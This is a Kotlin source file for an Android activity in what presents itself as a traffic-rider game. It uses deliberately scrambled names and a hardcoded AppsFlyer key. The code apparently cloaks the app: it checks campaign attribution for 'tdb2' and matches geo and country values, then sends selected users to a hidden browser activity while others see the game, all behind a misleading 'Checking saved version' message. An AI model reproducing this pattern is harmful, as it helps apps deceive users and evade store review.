package com.skgames.trafficriderp.accctifiilelr

import android.content.Intent
import com.skgames.trafficriderp.mainclaaas.GooddderClasssa.Companion.geomeogtgt
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit
import com.orhanobut.hawk.Hawk
import com.skgames.trafficriderp.brovseravtiv.BrovisierActivity
import com.skgames.trafficriderp.databinding.ActivityTvooooFilltBinding
import com.skgames.trafficriderp.gaaaame.GammiiiActivity
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.widget.Toast
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import com.skgames.trafficriderp.mainclaaas.GooddderClasssa.Companion.C1gttggtgt
import com.skgames.trafficriderp.mainclaaas.GooddderClasssa.Companion.DEEPLfrfrfrfr
import com.skgames.trafficriderp.mainclaaas.GooddderClasssa.Companion.appsCheckfrr6
import com.skgames.trafficriderp.mainclaaas.GooddderClasssa.Companion.countryCodefrrfrfrfrrf



class TvooooFilltActivity : AppCompatActivity() {

    private fun intWEdrfrrfiiii() {
        val bhnhnhhnnnbnb = Intent(this@TvooooFilltActivity, BrovisierActivity::class.java)
        gtkgtkgtkgtkgt()
        startActivity(bhnhnhhnnnbnb)
        finish()
    }

    private fun gtkgtkgtkgtkgt() {
        gtjgtgtth()
        hkykohykohyk()
    }

    private fun gtjgtgtth() {
        Hawk.put(geomeogtgt, null)
    }

    private fun hkykohykohyk() {
        Hawk.put(countryCodefrrfrfrfrrf, null)
        Hawk.put(appsCheckfrr6, null)
    }

    override fun onCreate(savedInstanceState: Bundle?) {

        super.onCreate(savedInstanceState)
        filltBinding = ActivityTvooooFilltBinding.inflate(layoutInflater)
        setContentView(filltBinding.root)

        Toast.makeText(this, "Checking saved version", Toast.LENGTH_SHORT).show()

        val vbvbvvbv: String? = Hawk.get(appsCheckfrr6, "null")

        if (vbvbvvbv == "1") {
            AppsFlyerLib.getInstance()
                .init("JwQrBNWeuDtfwGbA5idzeX", ggggg, applicationContext)
            AppsFlyerLib.getInstance().start(this)
        }

        vbvvbbv()

    }

    private fun hyyhygggg() {
        val vgbgbgbgbg = Intent(this@TvooooFilltActivity, GammiiiActivity::class.java)
        gtkgtkgtkgtkgt()
        startActivity(vgbgbgbgbg)
        finish()
    }

    private val ggggg = object : AppsFlyerConversionListener {
        override fun onConversionDataSuccess(data: MutableMap<String, Any>?) {
            val dataGotten = data?.get("campaign").toString()
            Hawk.put(C1gttggtgt, dataGotten)
        }
        override fun onConversionDataFail(p0: String?) {}
        override fun onAppOpenAttribution(p0: MutableMap<String, String>?) {}
        override fun onAttributionFailure(p0: String?) {}
    }

    lateinit var filltBinding: ActivityTvooooFilltBinding

    private fun vbvvbbv() {

        val gggggggggg: String = Hawk.get(geomeogtgt)
        val vvvvvvvvvvvb: String? = Hawk.get(appsCheckfrr6, "null")
        var iiiiiiiiiio: String? = Hawk.get(C1gttggtgt)
        val kiiiiiiiii: String? = Hawk.get(DEEPLfrfrfrfr, "null")
        val gbbbbbbbbb: String = Hawk.get(countryCodefrrfrfrfrrf, "null")

        if (vvvvvvvvvvvb == "1") {


            val gfgfgfgf = Executors.newSingleThreadScheduledExecutor()
            gfgfgfgf.scheduleAtFixedRate({
                if (iiiiiiiiiio != null) {

                    if (iiiiiiiiiio!!.contains("tdb2") || gggggggggg.contains(gbbbbbbbbb) || kiiiiiiiii!!.contains("tdb2")) {
                        gfgfgfgf.shutdown()
                        intWEdrfrrfiiii()
                    } else {
                        gfgfgfgf.shutdown()
                        hyyhygggg()

                    }
                } else {
                    iiiiiiiiiio = Hawk.get(C1gttggtgt)

                }
            }, 0, 1, TimeUnit.SECONDS)
        }  else if (gggggggggg.contains(gbbbbbbbbb)) {
            intWEdrfrrfiiii()
        } else {
            hyyhygggg()
        }

    }


}